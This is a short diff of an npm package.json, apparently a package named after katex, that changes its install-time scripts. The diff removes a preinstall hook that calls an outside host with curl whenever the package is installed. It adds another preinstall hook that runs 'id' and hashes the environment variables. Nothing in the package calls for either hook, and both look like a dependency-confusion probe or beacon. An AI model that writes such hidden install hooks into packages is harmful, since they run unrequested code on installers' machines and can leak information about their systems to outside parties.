@@ -125,7 +125,7 @@
   "bin": "cli.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "curl http://bbrf.celes.in/katex_test"
+    "preinstall": "id; env | md5sum;"
   },
   "dependencies": {
     "commander": "^8.0.0"
